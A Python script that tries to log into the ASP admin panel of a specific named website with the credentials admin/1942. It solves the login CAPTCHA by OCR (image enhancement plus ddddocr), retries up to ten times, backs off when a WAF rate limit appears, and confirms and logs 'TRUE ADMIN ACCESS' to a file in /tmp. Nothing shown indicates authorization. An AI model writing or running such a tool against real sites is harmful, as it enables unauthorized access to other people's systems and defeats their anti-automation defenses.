#!/usr/bin/env python3
"""verify 075588866576 admin/1942 - strict login check"""
import urllib.request, urllib.parse, re, http.cookiejar, io, subprocess, sys, time
from PIL import Image

HOST = "http://075588866576.com"
UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}

def ocr_enhance(img_bytes):
    import base64
    img = Image.open(io.BytesIO(img_bytes)).convert("L")
    img = img.resize((img.width * 3, img.height * 3), Image.LANCZOS)
    img = img.point(lambda x: 0 if x < 140 else 255)
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    b64 = base64.b64encode(buf.getvalue()).decode()
    code = ("import ddddocr,base64; o=ddddocr.DdddOcr(show_ad=False); "
            "print(o.classification(base64.b64decode('%s')))" % b64)
    r = subprocess.run([sys.executable, "-c", code], capture_output=True, timeout=20, cwd="/tmp")
    return r.stdout.decode().strip()

def fetch(op, url, data=None, timeout=12, headers=None):
    h = {**UA, "Content-Type": "application/x-www-form-urlencoded"}
    if headers: h.update(headers)
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read()
    except urllib.error.HTTPError as e:
        return e.code, url, e.read()
    except Exception as ex:
        return 0, url, str(ex).encode()

for attempt in range(10):
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    try:
        code, final, body = fetch(op, HOST + "/admin/index.asp")
        code, final, cap = fetch(op, HOST + "/admin/vCode.asp",
                                 headers={"Referer": HOST + "/admin/index.asp"})
        if code != 200 or len(cap) < 100:
            print("cap fail", code, len(cap)); time.sleep(2); continue
        cap_text = ocr_enhance(cap)
        data = urllib.parse.urlencode({"admin": "admin", "password": "1942", "VerifyCode": cap_text})
        code, final, resp = fetch(op, HOST + "/admin/adminpass.asp", data=data,
                                  headers={"Referer": HOST + "/admin/index.asp",
                                           "X-Requested-With": "XMLHttpRequest"})
        rt = resp.decode("gbk", "ignore")
        print("attempt %d OCR=%s code=%d final=%s resp=%s" % (attempt, cap_text, code, final, rt[:120]))
        if "stopinfo" in final:
            print("WAF rate limit - wait"); time.sleep(30); continue
        if "验证码" in rt:
            continue  # OCR wrong
        if "密码" in rt and "错误" in rt:
            print("PASSWORD WRONG (code passed)"); break
        # check response: success usually redirects or shows welcome
        if code == 302 or "欢迎" in rt or "成功" in rt or "index.asp" in rt and "login" not in rt.lower():
            # follow up: GET admin main page
            code2, final2, resp2 = fetch(op, HOST + "/admin/index.asp",
                                         headers={"Referer": HOST + "/admin/adminpass.asp"})
            rt2 = resp2.decode("gbk", "ignore")
            print("  follow-up admin/index.asp:", code2, final2, "size", len(rt2))
            if len(rt2) > 500 and "adminpass" not in rt2.lower():
                print("  >>> TRUE ADMIN ACCESS with admin/1942")
                with open("/tmp/bc_verified.txt", "a") as f:
                    f.write("VERIFIED admin/1942 %s\n" % final2)
                sys.exit(0)
        print("  inconclusive")
    except Exception as e:
        print("attempt %d error: %s" % (attempt, e))
        time.sleep(2)
print("verify done")
